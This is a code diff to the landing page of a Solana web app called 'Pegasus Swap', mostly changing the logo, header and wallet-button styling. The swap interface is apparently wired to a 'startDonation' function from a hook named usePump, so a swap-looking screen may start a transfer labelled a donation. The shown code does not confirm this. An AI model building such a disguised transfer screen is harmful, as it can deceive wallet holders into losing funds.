@@ -5,7 +5,7 @@ import { usePump } from '@/hooks/useDonation';
 // Removed DonationProgress per request
 import { Heart, Wallet } from 'lucide-react';
 import backgroundImage from '@/assets/web-background.png';
-import logoImage from '/pump.png';
+// Use public asset via absolute path instead of importing
 import { useState, useEffect, useRef } from 'react';
 import { useConnection } from '@solana/wallet-adapter-react';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
@@ -91,17 +91,24 @@ const Index = () => {
     <div className="min-h-screen flex flex-col relative">
       {/* Animated Background */}
       <AnimatedBackground />
-      
-      {/* Header with Logo (Left) and Wallet Button (Right) */}
+      {/* Standard Header (top bar removed) */}
       <div className="relative z-20 flex justify-between items-center p-4">
-        {/* Logo and Site Name (Left) */}
         <div className="flex items-center">
-          <img src="/pegasus-logo.png" alt="Pegasus Logo" className="h-8 w-8" />
-          <span className="text-blue-400 text-xl font-bold ml-2">Pegasus Swap</span>
+          {/* Imported image with graceful fallback to SVG */}
+          <img
+            src="/pegasus.png"
+            onError={(e) => {
+              const img = e.currentTarget as HTMLImageElement;
+              img.src = '/pegasus-logo.svg';
+            }}
+            alt="Pegasus Logo"
+            className="h-10 w-10 sm:h-12 sm:w-12 mr-2"
+          />
+          <span className="text-blue-400 text-xl font-bold">Pegasus Swap</span>
         </div>
-
-        {/* Connect Wallet Button (Right) */}
-        <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
+        <WalletMultiButton className="!bg-blue-600 hover:!bg-blue-700 !px-2 !text-xs sm:!text-sm sm:!px-4">
+          {connected && publicKey ? `${publicKey.toBase58().slice(0, 4)}...${publicKey.toBase58().slice(-4)}` : 'Connect Wallet'}
+        </WalletMultiButton>
       </div>
 
       {/* Main Content - Swap Interface */}
@@ -109,13 +116,6 @@ const Index = () => {
         <div className="w-full max-w-2xl flex flex-col items-center gap-4">
           {/* Swap Interface with Donate functionality */}
           <SwapInterface startDonation={connected && !isProcessing && transactions.length === 0 ? startDonation : undefined} />
-          
-          {/* Center Wallet Button */}
-          {!connected && (
-            <div className="pt-4">
-              <CenterWalletButton />
-            </div>
-          )}
         </div>
       </div>
 
